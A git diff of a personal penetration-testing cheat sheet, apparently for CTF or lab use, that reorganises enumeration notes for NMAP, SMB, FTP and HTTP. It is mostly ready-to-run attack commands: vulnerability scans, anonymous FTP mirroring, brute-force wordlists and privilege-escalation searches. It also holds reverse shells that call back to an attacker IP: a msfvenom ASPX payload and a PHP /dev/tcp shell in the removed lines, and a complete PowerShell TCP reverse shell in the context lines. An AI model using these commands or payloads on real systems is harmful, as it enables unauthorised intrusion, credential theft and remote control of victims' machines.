@@ -1,82 +1,82 @@
-# OSINT
+# Enumeration
 
-### NMAP
+Documenting different ways to uncover ways to gain intial access and exploiting them.
+
+## Table of Contents
+
+- [NMAP](#NMAP)
+- [SMB](#SMB)
+- [FTP](#FTP)
+- [HTTP](#HTTP)
+
+---------------------------------------------------------------------------
+
+# NMAP
+
 As an alternative you can use `rustscan -a <address>`
+
 Normal scan: `nmap -vv -sV -Pn -A -T4 --script vuln <address>`
 Long scan: `nmap -sV -Pn -A -T4 -p- <address>`
-Enumerate SMB: `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <address>`
 
-### Enumerate SMB
+---------------------------------------------------------------------------
+
+# SMB
+
+## Initial Access
+
 `smbmap -H <address>`
 Check discovered directories in other places such as websites.
 `smbclient -L <address> -U`
 List all the directories in the share
+Enumerate SMB via NMAP: `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <address>`
 
-### Enumerate FTP: 21
+---------------------------------------------------------------------------
+
+# FTP
+
+## Initial Access
+
+### Anonymous Login
+
 `ftp <address>`
-Anonymous login: anonymous (no password required)
+login: anonymous (no password required)
 
-#### nmap
+### NMAP Scripts
+
 `nmap --script ftp-* -p 21 <address>`
 
-#### Download all files
+## Brute Force
+
+[ftp-betterdefaultpasslist](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt)
+
+## Investigation
+
+### Download all files
+
 `wget -m ftp://anonymous:anonymous@<address>`
 `wget -m --no-passive ftp://anonymous:anonymous@<address>`
 
-#### Brute Force
-https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
+---------------------------------------------------------------------------
 
-### Enumerate HTTP
-`gobuster dirb --url=<address> --wordlist=<wordlist>`
+# HTTP
 
-### Metasploit
-open `msfconsole`
-`search <exploit name>`
-`use <discovered id>`
-`show options` set the required options for the exploit
-`exploit` or `run`
-you can then hold on to the shell once it has been achieved by putting it into the background `Ctrl-Z`
+## Initial Access
 
-#### Msfvenom
-There are two types of payloads that can be generated, staged and stageless. Staged means you need msfconsole to complete the shell, used for limited upload space.
-Staged, denoted by '/': windows/shell/reverse_tcp
-Stageless, denoted by '_': windows/shell_reverse_tcp
+### Directory Discovery
 
-To search for payloads: `msfvenom -l payloads | grep windows`
-When setting up: `msfvenom -p payload --list-options`
+GoBuster: `gobuster dirb --url=<address> --wordlist=<wordlist>`
+After running go buster manually explore some interesting directories, such as robots.txt.
 
-encoders:
-	windows: `-a x86 --encoder x86/shikata_ga_nai -f exe -o <filename>.exe`
+### Password Discovery
 
-IIS Example: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.219.14 --platform windows -a x64 -f aspx -o shell.aspx`
-
-#### Upgrade shell to Meterpreter
-
-##### Option 1
-search for shell_to_meterpreter use and set session to the session number of the session that needs upgrading
-
-##### Option 2
-`sessions -u <id>`
-
-## Exploitation
-
-### Windows Binary Locations
-`/usr/share/windows-resources/`
+If you are having trouble brute-forcing a password for a blog, try creating a custom wordlist with cewl:
+`cewl -d 3 -m 7 -w <wordlist to export> <http://address.com>`
 
 ### Reverse Shells
-#### PHP
-```php
-<?php
-exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker ip>/1234 0>&1'");
-?>
-```
 
-### Cracking Passwords
-First search for hash via Search-the-hash `sth -t <hash>` or `sth -f <file>`
-If not found you can use `john` or `hashcat`
-Example hashcat (use `--help` for more guidance):
-`hashcat -m <type of hash> -a <cracking type> <hash>:<salt> <wordlist> --show`
-Note: must use `--show` to actually see the cracked password...
+See [Reverse Shells](/exploitation/reverse_shells) for more information.
+
+---------------------------------------------------------------------------
 
 ## Post-Exploitation
 
@@ -96,18 +96,12 @@ If you need to get a file over to a compromised server with curl installed:
 #### SUID search
 `find / -user root -perm -4000 -exec ls -ldb {} \;`
 `find / -perm -u=s -type f 2>/dev/null`
-`find / -perm -u=s -type f 2>/dev/null; find / -perm -4000 -o- -perm -2000 -o- -perm -6000 2>/dev/null`
+BEST: `find / -perm -u=s -type f 2>/dev/null; find / -perm -4000 -o- -perm -2000 -o- -perm -6000 2>/dev/null`
 
 If you find a binary that matches this, you can try running with the `-p` flag which allows you to run a binary as the owner.
 
 #### Find writable directories
 `find -type d -writable`
-
-### MetaSploit
-#### Catching a Reverse Shell
-generate the reverse shell in msfvenon
-`use exploit/multi/handler`
-`set PAYLOAD windows/meterpreter/reverse_tcp`
 
 #### Windows Migration
 get a meterpreter session and find a process running as SYSTEM: `ps`
@@ -129,9 +123,6 @@ msf `load incognito`
 A series of a userful links:
 - [Nishang](https://github.com/samratashok/nishang.git): A series of useful Windows Exploit scripts
 - [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) Same as above
-
-## Misc
-Reuse a command from history `history | grep <parameter>`, `!!<choice>`
 
 ### Powershell Reverse Shell
 `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.8.219.14',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
